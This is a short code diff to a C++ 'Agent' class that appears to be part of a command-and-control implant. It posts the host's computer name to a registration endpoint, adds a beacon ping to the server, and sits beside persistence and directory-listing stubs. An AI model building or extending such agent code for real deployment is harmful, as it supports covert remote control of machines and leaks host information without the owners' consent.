@@ -1,7 +1,7 @@
 #include "Agent.h"
 
 
-void Agent::Register(std::string ip, unsigned int port) {
+void Agent::Register(std::wstring ip, unsigned int port) {
 	const int buffer_size = MAX_COMPUTERNAME_LENGTH + 1;
 	char buffer[buffer_size];
 	DWORD lpnSize = buffer_size;
@@ -11,7 +11,7 @@ void Agent::Register(std::string ip, unsigned int port) {
 	ComputerName = std::string{ buffer };
 
 
-	Post(RETURN_URI, "register?comp=" + ComputerName);
+	Post(RETURN_URI, "/register?comp=" + ComputerName);
 }
 
 
@@ -151,4 +151,8 @@ void Agent::persist(std::vector<std::string> args) {
 
 void Agent::listdir(std::vector<std::string> args) {
 
+}
+
+void Agent::ping() {
+	Get(L"/ping/" + AgentID);
 }
